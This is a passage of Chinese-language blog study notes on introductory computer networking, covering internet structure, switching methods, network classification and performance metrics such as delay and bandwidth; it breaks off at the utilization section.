    <content type="html"><![CDATA[<p>这个笔记配合<a href="https://www.bilibili.com/video/BV1c4411d7jb">计算机网络微课堂</a>食用效果更佳，这位老师的PPT做得真的好，讲得也特别简单易懂，力推！</p><span id="more"></span><h1 id="1-计算机网络概述"><a href="#1-计算机网络概述" class="headerlink" title="1. 计算机网络概述"></a>1. 计算机网络概述</h1><h2 id="1-1-网络、互连网-互联网-和因特网"><a href="#1-1-网络、互连网-互联网-和因特网" class="headerlink" title="1.1 网络、互连网(互联网)和因特网"></a>1.1 网络、互连网(互联网)和因特网</h2><p>网络(Network)由若干结点(Node)和连接这些结点的链路(Link)组成。</p><p>多个网络还可以通过路由器互连起来，这样就构成了一个覆盖范围更大的网络，即互联网(或互连网)。因此，互联网是“网络的网络(Netwrok of Networks)”。</p><p>因特网(Internet)是世界上最大的互连网络(用户数以亿计，互连的网络数以百万计)。</p><p>internet与lnternet的区别：</p><ul><li>internet(互联网或互连网)是一个通用名词，它泛指由多个计算机网络互连而成的网络。在这些网络之间的通信协议可以是任意的。</li><li>Internet(因特网) 则是一个专用名词，它指当前全球最大的、开放的、由众多网络相互连接而成的特定计算机网络，它采用TCP/IP协议族作为通信的规则，其前身是美国的ARPANET。</li></ul><h2 id="1-2-因特网发展的三个阶段"><a href="#1-2-因特网发展的三个阶段" class="headerlink" title="1.2 因特网发展的三个阶段"></a>1.2 因特网发展的三个阶段</h2><img src="/posts/e255a10a/1.1.png" class="" title="因特网发展的三个阶段"><p>因特网服务提供者ISP(Internet Service Provider)：提供给用户IP地址的角色，每个用户通过ISP提供的IP地址使用互联网，没有IP地址不可以使用互联网。我国主要的ISP是我们熟悉的中国电信、中国联通和中国移动这三大电信运营商。</p><img src="/posts/e255a10a/1.2.png" class="" title="基于ISP的三级结构互联网"><h2 id="1-3-因特网的组成"><a href="#1-3-因特网的组成" class="headerlink" title="1.3 因特网的组成"></a>1.3 因特网的组成</h2><p>因特网由边缘部分和核心部分组成。</p><ol><li><p>边缘部分<br>由所有连接在因特网上的主机组成。这部分是用户直接使用的，用来进行通信(传送数据、音频或视频)和资源共享</p></li><li><p>核心部分<br>由大量网络和连接这些网络的路由器组成。这部分是为边缘部分提供服务的(提供连通性和交换)</p></li></ol><h2 id="1-4-计算机网络三种数据交换方式"><a href="#1-4-计算机网络三种数据交换方式" class="headerlink" title="1.4 计算机网络三种数据交换方式"></a>1.4 计算机网络三种数据交换方式</h2><h3 id="1-4-1-电路交换"><a href="#1-4-1-电路交换" class="headerlink" title="1.4.1 电路交换"></a>1.4.1 电路交换</h3><p>电话交换机接通电话线的方式称为电路交换。</p><p>从通信资源的分配角度来看，交换(Switching)就是按照某种方式动态地分配传输线路的资源。</p><p>电路交换的三个步骤：</p><ol><li>建立连接（分配通信资源)</li><li>通话（一直占用通信资源)</li><li>释放连接（归还通信资源)</li></ol><p>在建立后不论通信资源有没有使用，都不会进行中断，除非用户中断。当使用电路交换来传送计算机数据时, 其线路的传输效率往往很低。</p><h3 id="1-4-2-分组交换"><a href="#1-4-2-分组交换" class="headerlink" title="1.4.2 分组交换"></a>1.4.2 分组交换</h3><p>把整块数据/信息分为多个数据段(相对于报文传输而言)，数据段分开传输。在数据段前面加上首部后，成为一个分组。以分组为单位传输。</p><p>各个分组交换机会把分组先存储下来，然后根据其头部信息中的目的地址，发送给下一个交换机。各个交换机进行对分组信息的储存转发后，最终到达接收方。接收方处理及再去除分组首部，还原出报文。传输完成。</p><p>在转发过程中有两个特点：</p><ol><li>各分组从发送方到达接收方可以经过不同的交换机。</li><li>各分组到达接收方的顺序不定，可能出现乱序。</li></ol><p>在分组传输中各个角色主要功能：</p><ul><li>发送方：构造分组，发送分组</li><li>路由器：缓存分组，转发分组</li><li>接收方：接受分组，还原报文</li></ul><h3 id="1-4-3-报文交换"><a href="#1-4-3-报文交换" class="headerlink" title="1.4.3 报文交换"></a>1.4.3 报文交换</h3><p>每一个结点接收整个报文，检查目标结点地址，然后根据网络中的通信情况在适当的时候转发到下一个结点。经过多次存储转发，最后到达目标，因而这样的网络叫存储转发网络。其中的交换结点要有足够大的存储空间(一般是磁盘)，用以缓冲收到的长报文。 </p><p>报文交换主要用于早期的电报通信网，现在较少使用，通常被较先进的分组交换方式所取代。</p><h3 id="1-4-4-三种交换方式的对比"><a href="#1-4-4-三种交换方式的对比" class="headerlink" title="1.4.4 三种交换方式的对比"></a>1.4.4 三种交换方式的对比</h3><img src="/posts/e255a10a/1.4.4.png" class="" title="三种交换方式的对比"><h2 id="1-5-计算机网络的定义和分类"><a href="#1-5-计算机网络的定义和分类" class="headerlink" title="1.5 计算机网络的定义和分类"></a>1.5 计算机网络的定义和分类</h2><p>计算机网络主要是一些通用的、可编程的硬件互连而成的，而这些硬件并非专门用来实现某一特定目的的，这些可编程的硬件能够用来传送多种不同类型的数据(如音频、数据等)，这些可编程的软件能支持广泛和日益增长的应用。</p><ol><li><p>按照交换技术分类</p><ul><li>电路交换网络</li><li>报文交换网络</li><li>分组交换网络</li></ul></li><li><p>按使用者分类</p><ul><li>公用网：电信公司构建的大型网络，面对公众开放，只要交钱既可使用，又叫公众网</li><li>专用网：某个部门为本单位的特殊业务工作需要而建造的网络。例如铁路部门、电信部门专门为自己构建的，不对外开放的网络</li></ul></li><li><p>按照传输介质分类</p><ul><li>有线网：双绞线(日常使用网线)、光纤</li><li>无线网：WIFI</li></ul></li><li><p>按覆盖范围分类</p><ul><li>广域网 WAN：覆盖面积通常为几十公里到几千公里，可以覆盖国家范围、洲际范围，有时也称为远程网。负责互连分布在不同区域的城域网和局域网，是最大范围的网络。</li><li>城域网 MAN：覆盖范围一般是一个城市。作用距离为5到50公里。通常作为城市骨干网，互连大量企业、机构、学校。</li><li>局域网 LAN：局域网一般是微信计算机或工作站通过告诉线路相连，范围一般是一个实验室、一栋楼或一个校园。覆盖范围1公里左右，通常由某个单位单独拥有、使用和维护。</li><li>个域网 PAN：个人区域网络。非用来连接普通计算机，而是在个人工作的地方把个人使用的电子设备，鼠标、键盘、耳机等用无线的方式连接起来形成的个人网络系统。覆盖范围10米左右。</li></ul></li><li><p>按拓扑结构分类</p><ul><li><p>总线型网络：总线型网络用单根传输线把计算机连接起来。</p><p>优点是建网容易，增减节点方便，节省线路。</p><p>缺点是重负载时通信效率不高，任意一处出现故障后全网瘫痪。</p></li><li><p>星型网络：星型网络是将每个计算机都以单独的线路与中央设备相连。中央设备现在一般是交换机或路由器。</p><p>优点：便于网络的集中控制和管理。</p><p>缺点：成本高，中央设备对故障敏感。</p></li><li><p>环型网络：环形网络是将所有计算机网络接口连接成一个环。环可以是单环或者双环，环中信号是单向传输的。</p></li><li><p>网状型网络：在网状结构中，每个节点至少由两条路径与其他节点相连接，多用在广域网中。</p><p>优点：可靠性高。</p><p>缺点：控制复杂，线路成本高。</p></li></ul></li></ol><p>以上四种结构中可以任意组合形成更加复杂的网络。</p><h2 id="1-6-计算机网络的性能指标"><a href="#1-6-计算机网络的性能指标" class="headerlink" title="1.6 计算机网络的性能指标"></a>1.6 计算机网络的性能指标</h2><h3 id="1-6-1-速率"><a href="#1-6-1-速率" class="headerlink" title="1.6.1 速率"></a>1.6.1 速率</h3><img src="/posts/e255a10a/1.6.png" class="" title="速率"><h3 id="1-6-2-带宽"><a href="#1-6-2-带宽" class="headerlink" title="1.6.2 带宽"></a>1.6.2 带宽</h3><p>用来表示网络的通信线路所能传送数据的能力，因此网络带宽表示在单位时间内从网络中的某一点到另一个点所能通过的“最高数据率”。</p><p>单位：b/s(kb/s, Mb/s, Gb/s, Tb/s)，与速率相同。</p><h3 id="1-6-3-吞吐量"><a href="#1-6-3-吞吐量" class="headerlink" title="1.6.3 吞吐量"></a>1.6.3 吞吐量</h3><p>吞吐量表示在单位时间内通过某个网络(或信道、接口)的数据量。</p><p>吞吐量被经常用于对现实世界中的网络的一种测量，以便知道实际上到底有多少数据量能够通过网络。</p><p>吞吐量受网络的带宽或额定速率的限制。</p><h3 id="1-6-4-时延"><a href="#1-6-4-时延" class="headerlink" title="1.6.4 时延"></a>1.6.4 时延</h3><script type="math/tex; mode=display">网络时延=发送时延+传播时延+处理时延</script><p><strong>发送时延</strong></p><script type="math/tex; mode=display">发送时延=\frac{分组长度(b)}{发送速率(b/s)}</script><p>发送速率受网卡的发送速率、信道带宽、接口速率影响。发送效率遵循木桶原理，由速率最低的模块决定，所以在选择网线、路由器等设备时，要考虑到整体的速率平衡问题。</p><p>发送速率 = min[网卡发送速率，信道带宽，交换机或路由器的接口速率]</p><p><strong>传播时延</strong></p><script type="math/tex; mode=display">传播时延=\frac{信道长度(m)}{电磁波传播速率(m/s)}</script><p>电磁波在自由空间的传播速率：<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="15.44ex" height="2.52ex" role="img" focusable="false" viewBox="0 -864 6824.6 1114"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mo" transform="translate(762.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(1818.6,0)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g><g data-mml-node="mo" transform="translate(2540.8,0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="msup" transform="translate(3541,0)"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(500,0)"></path></g><g data-mml-node="mn" transform="translate(1033,393.1) scale(0.707)"><path data-c="38" d="M70 417T70 494T124 618T248 666Q319 666 374 624T429 515Q429 485 418 459T392 417T361 389T335 371T324 363L338 354Q352 344 366 334T382 323Q457 264 457 174Q457 95 399 37T249 -22Q159 -22 101 29T43 155Q43 263 172 335L154 348Q133 361 127 368Q70 417 70 494ZM286 386L292 390Q298 394 301 396T311 403T323 413T334 425T345 438T355 454T364 471T369 491T371 513Q371 556 342 586T275 624Q268 625 242 625Q201 625 165 599T128 534Q128 511 141 492T167 463T217 431Q224 426 228 424L286 386ZM250 21Q308 21 350 55T392 137Q392 154 387 169T375 194T353 216T330 234T301 253T274 270Q260 279 244 289T218 306L210 311Q204 311 181 294T133 239T107 157Q107 98 150 60T250 21Z"></path></g></g><g data-mml-node="mi" transform="translate(4977.6,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(5855.6,0)"><g data-mml-node="mo"><path data-c="2F" d="M423 750Q432 750 438 744T444 730Q444 725 271 248T92 -240Q85 -250 75 -250Q68 -250 62 -245T56 -231Q56 -221 230 257T407 740Q411 750 423 750Z"></path></g></g><g data-mml-node="mi" transform="translate(6355.6,0)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g></g></g></svg></mjx-container></p><p>在铜线中：<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="17.2ex" height="2.52ex" role="img" focusable="false" viewBox="0 -864 7602.6 1114"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mo" transform="translate(762.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(1818.6,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" transform="translate(500,0)"></path><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z" transform="translate(778,0)"></path></g><g data-mml-node="mo" transform="translate(3318.8,0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="msup" transform="translate(4319,0)"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(500,0)"></path></g><g data-mml-node="mn" transform="translate(1033,393.1) scale(0.707)"><path data-c="38" d="M70 417T70 494T124 618T248 666Q319 666 374 624T429 515Q429 485 418 459T392 417T361 389T335 371T324 363L338 354Q352 344 366 334T382 323Q457 264 457 174Q457 95 399 37T249 -22Q159 -22 101 29T43 155Q43 263 172 335L154 348Q133 361 127 368Q70 417 70 494ZM286 386L292 390Q298 394 301 396T311 403T323 413T334 425T345 438T355 454T364 471T369 491T371 513Q371 556 342 586T275 624Q268 625 242 625Q201 625 165 599T128 534Q128 511 141 492T167 463T217 431Q224 426 228 424L286 386ZM250 21Q308 21 350 55T392 137Q392 154 387 169T375 194T353 216T330 234T301 253T274 270Q260 279 244 289T218 306L210 311Q204 311 181 294T133 239T107 157Q107 98 150 60T250 21Z"></path></g></g><g data-mml-node="mi" transform="translate(5755.6,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(6633.6,0)"><g data-mml-node="mo"><path data-c="2F" d="M423 750Q432 750 438 744T444 730Q444 725 271 248T92 -240Q85 -250 75 -250Q68 -250 62 -245T56 -231Q56 -221 230 257T407 740Q411 750 423 750Z"></path></g></g><g data-mml-node="mi" transform="translate(7133.6,0)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g></g></g></svg></mjx-container></p><p>在光纤中：<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="17.2ex" height="2.52ex" role="img" focusable="false" viewBox="0 -864 7602.6 1114"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mo" transform="translate(762.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(1818.6,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" transform="translate(500,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(778,0)"></path></g><g data-mml-node="mo" transform="translate(3318.8,0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="msup" transform="translate(4319,0)"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(500,0)"></path></g><g data-mml-node="mn" transform="translate(1033,393.1) scale(0.707)"><path data-c="38" d="M70 417T70 494T124 618T248 666Q319 666 374 624T429 515Q429 485 418 459T392 417T361 389T335 371T324 363L338 354Q352 344 366 334T382 323Q457 264 457 174Q457 95 399 37T249 -22Q159 -22 101 29T43 155Q43 263 172 335L154 348Q133 361 127 368Q70 417 70 494ZM286 386L292 390Q298 394 301 396T311 403T323 413T334 425T345 438T355 454T364 471T369 491T371 513Q371 556 342 586T275 624Q268 625 242 625Q201 625 165 599T128 534Q128 511 141 492T167 463T217 431Q224 426 228 424L286 386ZM250 21Q308 21 350 55T392 137Q392 154 387 169T375 194T353 216T330 234T301 253T274 270Q260 279 244 289T218 306L210 311Q204 311 181 294T133 239T107 157Q107 98 150 60T250 21Z"></path></g></g><g data-mml-node="mi" transform="translate(5755.6,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(6633.6,0)"><g data-mml-node="mo"><path data-c="2F" d="M423 750Q432 750 438 744T444 730Q444 725 271 248T92 -240Q85 -250 75 -250Q68 -250 62 -245T56 -231Q56 -221 230 257T407 740Q411 750 423 750Z"></path></g></g><g data-mml-node="mi" transform="translate(7133.6,0)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g></g></g></svg></mjx-container></p><p>要计算传播时延，先确定传播媒体，进而可以确定电磁波在该传输媒体中的传输速率。</p><p><strong>处理时延</strong></p><p>处理时延是路由器收到分组后对其进行存储转发产生的时延。不方便计算。排队时延也归到处理时延中。</p><p>在题目中，一般会写“处理时延忽略不计”。发送时延占主导还是传播时延占主导，要根据具体例子实际分析。</p><img src="/posts/e255a10a/1.6.4.png" class="" title="例题"><img src="/posts/e255a10a/1.6.5.png" class="" title="总结"><h3 id="1-6-5-时延带宽积"><a href="#1-6-5-时延带宽积" class="headerlink" title="1.6.5 时延带宽积"></a>1.6.5 时延带宽积</h3><script type="math/tex; mode=display">时延带宽积=传播时延×带宽</script><p>若发送端连续发送数据，则在所发送的第一个比特即将到达终点时，发送端就已经发送了时延带宽积个比特。</p><p>链路的时延带宽积又称为以比特为单位的链路长度。</p><h3 id="1-6-6-往返时间-RTT"><a href="#1-6-6-往返时间-RTT" class="headerlink" title="1.6.6 往返时间(RTT)"></a>1.6.6 往返时间(RTT)</h3><p>从发送端发送信息开始，到发送端接收到来自接收端发送的确认信息，称为往返时间(RTT)。</p><p>在许多情况下，因特网上的信息不仅仅单方向传输，而是双向交互。我们有时很需要知道双向交互一次所需的时间，因此，往返时间(RTT，Round-Trip Time)是一个重要的性能指标。</p><h3 id="1-6-7-利用率"><a href="#1-6-7-利用率" class="headerlink" title="1.6.7 利用率"></a>1.6.7 